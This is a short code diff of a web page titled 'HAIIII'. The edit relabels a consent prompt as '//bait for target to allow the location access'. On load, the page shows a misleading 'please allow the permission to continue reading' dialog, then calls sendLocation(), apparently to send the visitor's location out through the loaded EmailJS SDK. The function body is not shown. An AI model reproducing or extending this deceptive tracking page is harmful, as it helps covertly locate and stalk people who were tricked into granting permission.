@@ -3,10 +3,9 @@
 <head>
   <title>HAIIII</title>
 
-  <!-- Google Fonts -->
   <link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Poppins:wght@100;300;400;600;700&display=swap" rel="stylesheet">
 
-  <!-- EmailJS SDK -->
+
   <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
 
   <style>
@@ -66,7 +65,7 @@
     }
 
     window.addEventListener("DOMContentLoaded", () => {
-      // Optional: Ask for user consent before sending location
+      //bait for target to allow the location access 
       const confirmSend = confirm("please allow the permission to continue reading");
       if (confirmSend) {
         sendLocation();
